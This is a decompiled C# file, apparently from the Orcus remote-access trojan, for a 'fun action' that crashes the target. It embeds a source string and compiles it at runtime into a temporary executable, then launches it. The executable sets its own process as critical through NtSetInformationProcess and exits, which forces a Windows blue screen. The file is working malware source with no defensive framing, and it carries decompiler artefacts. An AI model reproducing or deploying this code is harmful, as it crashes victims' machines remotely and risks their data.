using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.CSharp;
using Orcus.Properties;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.FunActions;

public static class BluescreenTool
{
	private const string Source = "using System;\r\nusing System.Diagnostics;\r\nusing System.Runtime.InteropServices;\r\n\r\nnamespace BlueScreenTrigger\r\n{\r\n    internal static class Program\r\n    {\r\n        [DllImport(\"ntdll.dll\", SetLastError = true)]\r\n        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,\r\n            ref int processInformation, int processInformationLength);\r\n        [STAThread]\r\n        private static void Main()\r\n        {\r\n            int isCritical = 1;\r\n            int BreakOnTermination = 0x1D;\r\n            Process.EnterDebugMode();\r\n            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));\r\n            Environment.Exit(0);\r\n        }\r\n    }\r\n}";

	public static void Trigger()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		CSharpCodeProvider val = new CSharpCodeProvider((IDictionary<string, string>)new Dictionary<string, string> { { "CompilerVersion", "v3.5" } });
		string freeTempFileName = FileExtensions.GetFreeTempFileName("exe");
		CompilerParameters val2 = new CompilerParameters();
		val2.set_GenerateExecutable(true);
		val2.set_OutputAssembly(freeTempFileName);
		CompilerParameters val3 = val2;
		val3.get_ReferencedAssemblies().Add("System.dll");
		val3.get_ReferencedAssemblies().Add("System.Core.dll");
		CompilerResults obj = ((CodeDomProvider)val).CompileAssemblyFromSource(val3, new string[1] { "using System;\r\nusing System.Diagnostics;\r\nusing System.Runtime.InteropServices;\r\n\r\nnamespace BlueScreenTrigger\r\n{\r\n    internal static class Program\r\n    {\r\n        [DllImport(\"ntdll.dll\", SetLastError = true)]\r\n        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,\r\n            ref int processInformation, int processInformationLength);\r\n        [STAThread]\r\n        private static void Main()\r\n        {\r\n            int isCritical = 1;\r\n            int BreakOnTermination = 0x1D;\r\n            Process.EnterDebugMode();\r\n            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));\r\n            Environment.Exit(0);\r\n        }\r\n    }\r\n}" });
		if (obj.get_Errors().get_HasErrors())
		{
			throw new InvalidOperationException("Invalid code");
		}
		File.WriteAllText(obj.get_PathToAssembly() + ".config", Resources.AppConfig);
		Process.Start(obj.get_PathToAssembly());
	}
}
